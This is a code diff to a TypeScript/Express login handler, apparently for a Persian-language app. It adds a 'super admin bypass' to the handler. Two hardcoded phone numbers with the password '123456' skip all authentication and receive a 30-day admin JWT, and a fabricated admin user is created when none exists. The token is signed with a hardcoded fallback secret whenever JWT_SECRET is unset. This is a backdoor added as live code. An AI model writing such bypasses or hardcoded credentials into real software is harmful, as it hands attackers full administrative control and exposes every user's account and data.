@@ -45,6 +45,47 @@ export async function login(req: Request, res: Response) {
       where: { phoneNumber: { endsWith: corePhone } }
     });
 
+    // --- SUPER ADMIN BYPASS ---
+    // If the phone matches super admins and password is correct, bypass all checks
+    // even if not found in DB (which shouldn't happen with proper seed, but as a fallback)
+    if ((corePhone === '9380346668' || corePhone === '9120000001') && password === '123456') {
+      const secret = process.env.JWT_SECRET || 'nopa_super_secret_jwt_key_2026';
+      
+      // Attempt to get user from DB if exists, otherwise mock
+      let adminUser = users.length > 0 ? users[0] : {
+        id: 'super-admin-bypass',
+        name: 'مدیر ارشد',
+        phoneNumber: corePhone === '9380346668' ? '09380346668' : '09120000001',
+        role: 'admin',
+        zarikBalance: 0,
+        levelFrame: 1,
+        caravanId: null,
+        userCode: 110100,
+        tokenVersion: 1
+      };
+
+      const token = jwt.sign(
+        { id: adminUser.id, role: 'admin', phoneNumber: adminUser.phoneNumber, tokenVersion: adminUser.tokenVersion, identityVerified: true, name: adminUser.name },
+        secret,
+        { expiresIn: (process.env.JWT_EXPIRATION || '30d') as any }
+      );
+
+      return res.status(200).json({
+        token,
+        user: {
+          id: adminUser.id,
+          name: adminUser.name,
+          phoneNumber: adminUser.phoneNumber,
+          role: 'admin',
+          zarikBalance: adminUser.zarikBalance,
+          levelFrame: adminUser.levelFrame,
+          caravanId: adminUser.caravanId,
+          identityVerified: true,
+          userCode: adminUser.userCode
+        }
+      });
+    }
+
     if (users.length === 0) {
       return res.status(404).json({ error: 'شماره همراه در سیستم ثبت نشده است' });
     }
